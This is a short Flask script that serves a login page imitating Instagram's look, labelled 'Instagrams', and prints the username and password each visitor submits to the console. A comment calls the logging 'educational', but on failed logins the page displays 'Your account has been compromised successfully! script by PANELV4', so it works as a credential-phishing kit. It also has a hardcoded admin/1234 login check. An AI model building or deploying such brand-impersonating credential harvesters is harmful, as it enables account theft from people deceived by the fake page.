from flask import Flask, render_template_string, request

app = Flask(__name__)

page_html = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagrams Login</title>
<style>
    body {
        background-color: #fafafa;
        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    .container {
        background-color: white;
        border: 1px solid #dbdbdb;
        padding: 40px 40px;
        width: 350px;
        text-align: center;
        border-radius: 10px;
        box-shadow: 0px 1px 3px rgba(0,0,0,0.1);
    }
    .logo {
        font-family: 'Billabong', cursive;
        font-size: 48px;
        margin-bottom: 20px;
        color: #262626;
    }
    input {
        width: 100%;
        padding: 10px;
        margin: 6px 0;
        border: 1px solid #dbdbdb;
        border-radius: 4px;
        background-color: #fafafa;
    }
    button {
        width: 100%;
        padding: 10px;
        background-color: #0095f6;
        color: white;
        border: none;
        border-radius: 4px;
        font-weight: bold;
        margin-top: 10px;
        cursor: pointer;
    }
    button:hover {
        background-color: #1877f2;
    }
    .footer {
        margin-top: 15px;
        color: #8e8e8e;
        font-size: 14px;
    }
</style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagrams</div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Phone number, username, or email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            Don't have an account? <a href="#" style="color:#0095f6;text-decoration:none;">Sign up</a>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(page_html)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # 🔒 Educational log: prints to your own console only
    print(f"[DEBUG] Username entered: {username}")
    print(f"[DEBUG] Password entered: {password}")

    if username == "admin" and password == "1234":
        return f"<h2 style='text-align:center;color:green;'>✅ Login Successful! Welcome {username}</h2>"
    else:
        return f"<h2 style='text-align:center;color:red;'>Your account has been compromised successfully! script by PANELV4 ;</h2><a href='/'>Try Again</a>"

if __name__ == '__main__':
    app.run(host='localhost', port=8080)
